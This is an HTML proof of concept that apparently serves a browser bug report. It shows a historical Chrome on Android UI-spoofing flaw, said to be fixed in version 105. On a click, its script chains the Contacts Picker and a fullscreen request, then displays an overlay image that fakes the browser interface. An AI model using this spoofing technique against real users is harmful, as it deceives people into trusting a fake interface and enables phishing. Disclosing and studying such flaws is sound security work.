<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Chrome Android UI Spoof – Historical PoC</title>
  <meta name="viewport"
        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">

  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: #000;
      font-family: sans-serif;
      overflow: hidden;
    }

    #content {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      text-align: center;
      z-index: 1;
    }

    #spoof {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      display: none;
      z-index: 9999;
      pointer-events: none;
    }

    #note {
      position: fixed;
      bottom: 10px;
      left: 0;
      right: 0;
      font-size: 12px;
      text-align: center;
      opacity: .6;
    }
  </style>
</head>

<body>

<img id="spoof" src="spof2.png" alt="spoofed ui">

<div id="content">
  <h1>Click anywhere to continue</h1>
</div>

<div id="note">
  Historical PoC – fixed in Chrome ≥105
</div>

<script>
document.addEventListener('click', async () => {

  /* 1️⃣ Contacts Picker (user gesture) */
  if (navigator.contacts && navigator.contacts.select) {
    navigator.contacts.select(["name"], {})
      .catch(() => {});
  }

  /* 2️⃣ Request fullscreen */
  if (document.documentElement.requestFullscreen) {
    document.documentElement.requestFullscreen()
      .catch(() => {});
  }

  /* 3️⃣ Visual spoof overlay */
  document.getElementById('spoof').style.display = 'block';
  document.getElementById('content').style.display = 'none';

}, { once: true });

/* Observability for reports */
document.addEventListener('fullscreenchange', () => {
  console.log('fullscreen:', !!document.fullscreenElement);
});

document.addEventListener('visibilitychange', () => {
  console.log('visibility:', document.visibilityState);
});
</script>

</body>
</html>
